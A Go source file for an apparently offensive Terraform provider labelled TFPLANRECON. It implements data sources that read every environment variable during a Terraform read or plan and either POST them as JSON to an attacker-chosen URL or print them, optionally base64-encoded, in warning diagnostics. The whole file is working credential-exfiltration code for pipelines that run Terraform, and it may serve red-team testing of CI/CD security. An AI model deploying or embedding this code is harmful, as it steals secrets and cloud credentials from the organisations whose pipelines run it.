package techniques

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/hashicorp/terraform-plugin-sdk/v2/diag"
	"github.com/hashicorp/terraform-plugin-sdk/v2/helper/schema"
)

// EnvVarExfil returns the schema for environment variable exfiltration data source
func EnvVarExfil() *schema.Resource {
	return &schema.Resource{
		ReadContext: envVarExfilRead,

		Schema: map[string]*schema.Schema{
			"url": {
				Type:        schema.TypeString,
				Required:    true,
				Description: "The URL to send environment variables to",
			},
		},
	}
}

func envVarExfilRead(ctx context.Context, d *schema.ResourceData, m interface{}) diag.Diagnostics {
	var diags diag.Diagnostics
	config := m.(*ProviderConfig)
	client := config.Client

	url := d.Get("url").(string)

	envVars := GetEnvVars("")

	diags = append(diags, diag.Diagnostic{
		Severity: diag.Warning,
		Summary:  "TFPLANRECON Environment Variable Exfiltration",
		Detail:   fmt.Sprintf("Sending %d environment variables to %s", len(envVars), url),
	})

	payload, err := json.Marshal(envVars)
	if err != nil {
		return diag.FromErr(fmt.Errorf("error marshaling environment variables: %s", err))
	}

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(payload))
	if err != nil {
		return diag.FromErr(fmt.Errorf("error creating request: %s", err))
	}

	req.Header.Set("Content-Type", "application/json")

	resp, err := client.Do(req)
	if err != nil {
		return diag.FromErr(fmt.Errorf("error making POST request: %s", err))
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return diag.FromErr(fmt.Errorf("POST request failed with status: %d", resp.StatusCode))
	}

	d.SetId(url)
	return diags
}

// EnvVarPrint returns the schema for environment variable console printing data source
func EnvVarPrint() *schema.Resource {
	return &schema.Resource{
		ReadContext: envVarPrintRead,

		Schema: map[string]*schema.Schema{
			"base64_encode": {
				Type:        schema.TypeBool,
				Optional:    true,
				Default:     false,
				Description: "Whether to base64 encode the environment variables output",
			},
		},
	}
}

func envVarPrintRead(ctx context.Context, d *schema.ResourceData, m interface{}) diag.Diagnostics {
	var diags diag.Diagnostics
	base64Encode := d.Get("base64_encode").(bool)
	
	envVars := GetEnvVars("")
	
	if base64Encode {
		jsonData, err := json.Marshal(envVars)
		if err != nil {
			return diag.FromErr(fmt.Errorf("error marshaling environment variables: %s", err))
		}
		encoded := base64.StdEncoding.EncodeToString(jsonData)
		diags = append(diags, diag.Diagnostic{
			Severity: diag.Warning,
			Summary:  "TFPLANRECON Base64 Encoded Environment Variables",
			Detail:   fmt.Sprintf("Encoded data: %s", encoded),
		})
	} else {
		var envVarsList []string
		for key, value := range envVars {
			envVarsList = append(envVarsList, fmt.Sprintf("%s=%s", key, value))
		}
		envVarsString := strings.Join(envVarsList, "\n")
		
		diags = append(diags, diag.Diagnostic{
			Severity: diag.Warning,
			Summary:  "TFPLANRECON Environment Variables",
			Detail:   fmt.Sprintf("Environment variables:\n%s", envVarsString),
		})
	}
	
	d.SetId("env_var_print")
	return diags
}

// GetEnvVars returns a map of environment variables with optional prefix filtering
func GetEnvVars(prefix string) map[string]string {
	envVars := make(map[string]string)
	for _, env := range os.Environ() {
		pair := strings.SplitN(env, "=", 2)
		if prefix == "" || strings.HasPrefix(pair[0], prefix) {
			envVars[pair[0]] = pair[1]
		}
	}
	return envVars
}